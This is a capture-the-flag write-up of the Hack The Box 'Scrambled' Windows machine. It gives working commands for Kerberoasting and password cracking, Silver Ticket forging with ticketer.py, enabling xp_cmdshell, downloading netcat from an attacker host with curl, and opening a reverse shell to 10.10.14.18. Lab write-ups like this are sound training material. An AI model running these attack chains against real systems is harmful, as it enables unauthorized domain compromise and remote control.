# HTB - Scrambled

**IP Address:** `10.10.11.168`  
**OS:** Windows  
**Difficulty:** Hard  
**Tags:** #LDAP, #Kerberos, #SMB, #MSSQL, #SPN, #SilverTicket, #TGS, #SQLShell, #PrivilegeEscalation

---

## 1. Initial Enumeration

### 1.1 Ping

```bash
ping 10.10.11.168
```

✅ Host is up

---

### 1.2 Port Scanning

Initial full port scan:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.168 -oG allPorts
```

Extracted open ports using custom script:

```
53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 1433, 3268, 3269, 4411, 5985, 9389, 49666, 49673, 49674, 49716, 49720
```

Deep scan:

```bash
nmap -sCV -p<ports_above> 10.10.11.168 -oN targeted
```

---

## 2. LDAP & Domain Discovery

Identified domains:

- `scrm.local`
    
- `DC1.scrm.local`
    

Added to `/etc/hosts`.

Tried enumeration with `crackmapexec`, `rpcclient`, `smbmap`, `smbclient` – all failed due to lack of NTLM support.

LDAP enumeration:

```bash
ldapsearch -x -H ldap://10.10.11.168 -s base namingcontexts
ldapsearch -x -H ldap://10.10.11.168 -b 'DC=scrm,DC=local'
```

No interesting results.

---

## 3. Web Enumeration

Visited the web interface. It explicitly states:

> NTLM authentication has been disabled.

Under "Contact IT", discovered user: `ksimpson`

Enumerated user with Kerbrute:

```bash
kerbrute userenum --dc 10.10.11.168 -d scrm.local users
```

✅ `ksimpson` is a valid user.

---

## 4. Kerberos & SMB Access

Tried accessing SMB with assumed credentials (`ksimpson:ksimpson`):

```bash
impacket-smbclient -k scrm.local/ksimpson:ksimpson@DC1.scrm.local
```

✅ Successfully accessed shared folder `Public`

Downloaded a `.pdf` containing service ticket (SPN) information.

Attempted to get SPN ticket:

```bash
GetUserSPNs.py scrm.local/ksimpson -k -dc-ip 10.10.11.168 -dc-host dc1.scrm.local -request
```

Had to:

- Install `kinit`
    
- Configure `/etc/krb5.conf`
    
- Use `klist` to verify ticket
    

✅ Recovered hash for user `sqlsvc`

Cracked with John:

```bash
john -w:/usr/share/wordlists/rockyou.txt hash
```

🔑 Password: `Pegasus60`

---

## 5. MSSQL Access

Login failed via NTLM:

```bash
mssqlclient.py scrm.local/sqlsvc:Pegasus60@10.10.11.168
```

Generated TGT with:

```bash
getTGT.py scrm.local/sqlsvc:Pegasus60
export KRB5CCNAME=sqlsvc.ccache
```

Tried login with Kerberos:

```bash
mssqlclient.py dc1.scrm.local -k
```

❌ Blocked

---

## 6. Silver Ticket Attack

A Golden Ticket attack would require vulnerable users or direct KDC communication, so opted for a **Silver Ticket** approach.

### 6.1 Requirements:

- NTLM hash for `sqlsvc` → Converted from password using online tool
    
- Domain SID → Extracted with:
    

```bash
getPac.py scrm.local/ksimpson:ksimpson -targetUser Administrator
```

- SPN → Found earlier
    

### 6.2 Generate TGS

```bash
ticketer.py -spn MSSQLSvc/dc1.scrm.local -domain-sid <SID> -dc-ip dc1.scrm.local -nthash <ntlm> Administrator -domain scrm.local
```

Export ticket:

```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache
```

Connect to SQL:

```bash
mssqlclient.py scrm.local/Administrator@dc1.scrm.local -k -no-pass
```

✅ Access granted

---

## 7. Shell Access & Privilege Escalation

Enabled command shell in MSSQL:

```bash
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Uploaded `nc.exe` via HTTP server:

```bash
xp_cmdshell "curl 10.10.14.18/nc.exe -o C:\Temp\netcat.exe"
```

Listener:

```bash
rlwrap nc -nlvp 443
```

Reverse shell command:

```bash
xp_cmdshell "C:\Temp\netcat.exe -e cmd 10.10.14.18 443"
```

✅ Got a shell as SQL service user

---

## 8. User and Root Flag

Could not escalate directly via JuicyPotato (multiple ports failed), so retrieved flags directly from SQL:

```bash
SELECT * FROM OPENROWSET(BULK N'C:/Users/miscsvc/Desktop/user.txt', SINGLE_CLOB) AS Contents
SELECT * FROM OPENROWSET(BULK N'C:/Users/Administrator/Desktop/root.txt', SINGLE_CLOB) AS Contents
```

🏁 **User and Root flags retrieved**

---

# ✅ MACHINE COMPLETE